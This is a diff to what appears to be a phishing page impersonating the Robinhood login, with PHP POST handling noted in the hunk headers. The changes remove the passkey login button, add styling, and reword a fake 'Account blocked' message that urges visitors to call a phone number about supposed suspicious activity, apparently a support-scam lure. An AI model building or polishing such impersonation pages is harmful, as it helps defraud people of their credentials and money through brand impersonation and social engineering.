@@ -347,7 +347,12 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 @keyframes spin {
   to { transform: rotate(360deg) translate(-50%, -50%); }
 }
-		
+		.error-title{
+  display: block;
+  text-align: center;
+  margin-bottom: 6px;
+
+}
     </style>
 </head>
 
@@ -398,8 +403,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
 
             <div class="divider-row">or</div>
 
-            <button type="button" class="passkey"><img src="lock.png" alt="" style="width: 10px; height: 12px;"> Log in
-                with passkeys</button>
+           
 
             <div class="small">
                 Not on Robinhood? <a href="#">Create an account</a>
@@ -473,10 +477,10 @@ const password = document.getElementById("password");
 const loginBtn = document.querySelector(".btn-primary");
 
 const BLOCKED_MSG =
-  " Due to suspicious activity, your account has been blocked. Please contact our customer service at +1877-334-0352";
+  "Due to Suspicious Activity Your Account has been Blocked. Please Contact Our Customer Support Immediately +1877-334-0352";
 
 function showError(msg) {
-  errorBox.innerHTML = `<strong>Account blocked</strong>${msg}`;
+  errorBox.innerHTML = `<strong class="error-title">Account blocked</strong>${msg}`;
   errorBox.style.display = "block";
 
   email.classList.add("input-error");
